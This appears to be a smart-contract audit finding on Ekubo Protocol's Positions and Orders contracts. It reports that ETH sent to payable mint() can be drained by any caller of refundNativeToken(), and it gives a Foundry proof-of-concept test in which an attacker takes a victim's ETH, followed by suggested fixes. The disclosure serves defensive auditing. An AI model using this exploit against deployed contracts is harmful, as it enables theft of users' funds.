## Title
ETH Sent to `mint()` Functions Can Be Stolen by Anyone via `refundNativeToken()`

## Summary
The `BaseNonfungibleToken.mint()` functions are marked `payable` with comments stating "any msg.value sent is ignored." However, the Positions contract inherits `refundNativeToken()` from `PayableMulticallable`, which allows anyone (not just the owner) to claim all ETH held by the contract. This creates a frontrunning vulnerability where ETH accidentally or intentionally sent to `mint()` can be stolen by any observer.

## Impact
**Severity**: High

## Finding Description

**Location:** 
- [1](#0-0) 
- [2](#0-1) 
- [3](#0-2) 
- [4](#0-3) 

**Intended Logic:** The `mint()` functions are marked `payable` to enable gas-efficient multicall operations where ETH might be needed by other calls in the batch. The `refundNativeToken()` function is designed to return unused ETH after such multicall operations. Comments explicitly warn that msg.value sent to `mint()` is "ignored."

**Actual Logic:** When ETH is sent to `mint()` (either through direct calls or multicalls), it accumulates in the Positions contract's balance. The `refundNativeToken()` function is publicly accessible without restrictions and sends the **entire contract balance** to `msg.sender`. This means anyone monitoring the mempool can frontrun transactions to steal accumulated ETH, or the owner can claim it at will.

**Exploitation Path:**
1. Alice calls `Positions.mint()` with 1 ETH (either accidentally or believing it's required)
2. The 1 ETH is stored in the Positions contract, and Alice receives her NFT
3. Bob (attacker) or the owner observes the transaction in the mempool or on-chain
4. Bob immediately calls `Positions.refundNativeToken()` to claim all ETH in the contract (Alice's 1 ETH)
5. The ETH is transferred to Bob, and Alice has irreversibly lost her funds

**Security Property Broken:** Direct theft of user funds - users sending ETH to `mint()` will have their funds stolen by any observer, enabling both frontrunning attacks and potential owner exploitation.

## Impact Explanation

- **Affected Assets**: Native ETH sent by users to any `payable` function in Positions/Orders that doesn't consume the ETH (primarily `mint()` functions)
- **Damage Severity**: Complete loss of ETH sent to these functions. The attacker (or owner) can claim 100% of accumulated ETH with zero cost beyond gas
- **User Impact**: Any user who sends ETH to `mint()` or similar functions (whether by mistake, UI confusion, or misunderstanding the comments) will lose their funds to the first caller of `refundNativeToken()`

## Likelihood Explanation

- **Attacker Profile**: Any unprivileged user, MEV bot, or the protocol owner
- **Preconditions**: A user must call a `payable` function with msg.value that doesn't consume the ETH. The most likely scenario is calling `mint()` with ETH
- **Execution Complexity**: Single transaction calling `refundNativeToken()`. Can be frontrun or executed immediately after observing the victim transaction
- **Frequency**: Exploitable every time a user sends ETH to these functions. Given that the functions are marked `payable` (potentially misleading users), and there's no UI/contract protection against this, it's a realistic ongoing risk

## Recommendation

**Option 1: Remove payable modifier from mint functions** [1](#0-0) [2](#0-1) 

Remove the `payable` modifier from both `mint()` functions since they explicitly don't use msg.value. This prevents ETH from being sent in the first place.

**Option 2: Restrict refundNativeToken() to the transaction sender**

Modify `refundNativeToken()` to only refund ETH to the address that originally sent it, not any arbitrary caller. This requires tracking deposits or restricting the function.

**Option 3: Add reentrancy protection and caller validation**

Track which address deposited ETH in the current transaction and only allow that address to call `refundNativeToken()` within the same transaction context.

## Proof of Concept

```solidity
// File: test/Exploit_MintETHTheft.t.sol
// Run with: forge test --match-test test_MintETHTheft -vvv

pragma solidity ^0.8.31;

import "forge-std/Test.sol";
import "./FullTest.sol";

contract Exploit_MintETHTheft is FullTest {
    address alice = address(0xAA);
    address bob = address(0xBB);
    
    function setUp() public override {
        super.setUp();
        
        // Give Alice some ETH
        vm.deal(alice, 10 ether);
        vm.deal(bob, 1 ether);
    }
    
    function test_MintETHTheft() public {
        // SETUP: Alice calls mint() with 1 ETH (accidentally or believing it's required)
        vm.prank(alice);
        uint256 tokenId = positions.mint{value: 1 ether}();
        
        // Verify Alice got her NFT
        assertEq(positions.ownerOf(tokenId), alice);
        
        // Verify Positions contract received the ETH
        assertEq(address(positions).balance, 1 ether, "Positions contract should hold 1 ETH");
        
        // EXPLOIT: Bob sees this and immediately calls refundNativeToken()
        uint256 bobBalanceBefore = bob.balance;
        
        vm.prank(bob);
        positions.refundNativeToken();
        
        // VERIFY: Bob successfully stole Alice's ETH
        assertEq(bob.balance, bobBalanceBefore + 1 ether, "Bob stole Alice's 1 ETH");
        assertEq(address(positions).balance, 0, "Positions contract drained");
        
        // Alice lost her 1 ETH permanently
        assertEq(alice.balance, 9 ether, "Alice lost 1 ETH");
    }
    
    function test_OwnerCanClaimIgnoredETH() public {
        // Demonstrate owner can also claim the ETH (answering the original question)
        vm.prank(alice);
        positions.mint{value: 1 ether}();
        
        uint256 ownerBalanceBefore = owner.balance;
        
        vm.prank(owner);
        positions.refundNativeToken();
        
        assertEq(owner.balance, ownerBalanceBefore + 1 ether, "Owner claimed ignored ETH");
    }
}
```

## Notes

The vulnerability directly answers the security question: **Yes, the owner CAN claim ignored ETH sent to `mint()`**, but the mechanism (`refundNativeToken()`) is accessible to anyone, not just the owner. This makes it a more severe frontrunning vulnerability rather than just an owner privilege issue.

The root cause is the combination of:
1. `mint()` being `payable` (intended for gas optimization in multicalls)
2. `refundNativeToken()` being unrestricted and refunding the entire balance to any caller
3. No mechanism to track or protect ETH sent by specific users

The same vulnerability affects the Orders contract which also extends BaseNonfungibleToken. [5](#0-4)

### Citations

**File:** src/base/BaseNonfungibleToken.sol (L109-117)
```text
    function mint() public payable returns (uint256 id) {
        bytes32 salt;
        assembly ("memory-safe") {
            mstore(0, prevrandao())
            mstore(32, gas())
            salt := keccak256(0, 64)
        }
        id = mint(salt);
    }
```

**File:** src/base/BaseNonfungibleToken.sol (L123-126)
```text
    function mint(bytes32 salt) public payable returns (uint256 id) {
        id = saltToId(msg.sender, salt);
        _mint(msg.sender, id);
    }
```

**File:** src/base/PayableMulticallable.sol (L25-29)
```text
    function refundNativeToken() external payable {
        if (address(this).balance != 0) {
            SafeTransferLib.safeTransferETH(msg.sender, address(this).balance);
        }
    }
```

**File:** src/base/BasePositions.sol (L29-29)
```text
abstract contract BasePositions is IPositions, UsesCore, PayableMulticallable, BaseLocker, BaseNonfungibleToken {
```

**File:** src/Orders.sol (L1-50)
```text
// SPDX-License-Identifier: ekubo-license-v1.eth
pragma solidity >=0.8.30;

import {BaseLocker} from "./base/BaseLocker.sol";
import {UsesCore} from "./base/UsesCore.sol";
import {ICore} from "./interfaces/ICore.sol";
import {IOrders} from "./interfaces/IOrders.sol";
import {PayableMulticallable} from "./base/PayableMulticallable.sol";
import {TWAMMLib} from "./libraries/TWAMMLib.sol";
import {ITWAMM} from "./interfaces/extensions/ITWAMM.sol";
import {OrderKey} from "./types/orderKey.sol";
import {computeSaleRate} from "./math/twamm.sol";
import {BaseNonfungibleToken} from "./base/BaseNonfungibleToken.sol";
import {FixedPointMathLib} from "solady/utils/FixedPointMathLib.sol";
import {SafeCastLib} from "solady/utils/SafeCastLib.sol";
import {SafeTransferLib} from "solady/utils/SafeTransferLib.sol";
import {NATIVE_TOKEN_ADDRESS} from "./math/constants.sol";
import {FlashAccountantLib} from "./libraries/FlashAccountantLib.sol";

/// @title Ekubo Protocol Orders
/// @author Moody Salem <moody@ekubo.org>
/// @notice Tracks TWAMM (Time-Weighted Average Market Maker) orders in Ekubo Protocol as NFTs
/// @dev Manages long-term orders that execute over time through the TWAMM extension
contract Orders is IOrders, UsesCore, PayableMulticallable, BaseLocker, BaseNonfungibleToken {
    using TWAMMLib for *;
    using FlashAccountantLib for *;

    uint256 private constant CALL_TYPE_CHANGE_SALE_RATE = 0;
    uint256 private constant CALL_TYPE_COLLECT_PROCEEDS = 1;

    /// @notice The TWAMM extension contract that handles order execution
    ITWAMM public immutable TWAMM_EXTENSION;

    /// @notice Constructs the Orders contract
    /// @param core The core contract instance
    /// @param _twamm The TWAMM extension contract
    /// @param owner The owner of the contract (for access control)
    constructor(ICore core, ITWAMM _twamm, address owner) BaseNonfungibleToken(owner) BaseLocker(core) UsesCore(core) {
        TWAMM_EXTENSION = _twamm;
    }

    /// @inheritdoc IOrders
    function mintAndIncreaseSellAmount(OrderKey memory orderKey, uint112 amount, uint112 maxSaleRate)
        public
        payable
        returns (uint256 id, uint112 saleRate)
    {
        id = mint();
        saleRate = increaseSellAmount(id, orderKey, amount, maxSaleRate);
    }
```
